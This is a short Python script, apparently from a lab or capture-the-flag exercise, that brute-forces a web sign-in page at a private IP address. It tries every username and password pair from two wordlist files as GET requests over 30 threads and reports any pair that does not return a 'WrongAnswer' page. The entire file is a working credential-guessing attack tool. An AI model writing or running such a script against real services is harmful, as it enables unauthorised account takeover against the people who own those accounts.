import requests
from concurrent.futures import ThreadPoolExecutor

# extract contents
with open('usernames.txt', 'r') as file:
    logins = file.read().split('\n')

with open('passwords.txt', 'r') as file:
    passwords = file.read().split('\n')

def try_login(login, password):
    url = f"http://192.168.165.3/index.php?page=signin&username={login}&password={password}&Login=Login#"
    response = requests.get(url)
    print(f"Trying: login - {login} password - {password}")
    
    if "WrongAnswer" not in response.text:
        print(f"===== SUCCESS! Login: {login}, password: {password} =====")

#use 30 threads cuz way too slow
with ThreadPoolExecutor(max_workers=30) as executor:
    for login in logins:
        for password in passwords:
            executor.submit(try_login, login, password)


#probably couldve used async here I think can be way faster

    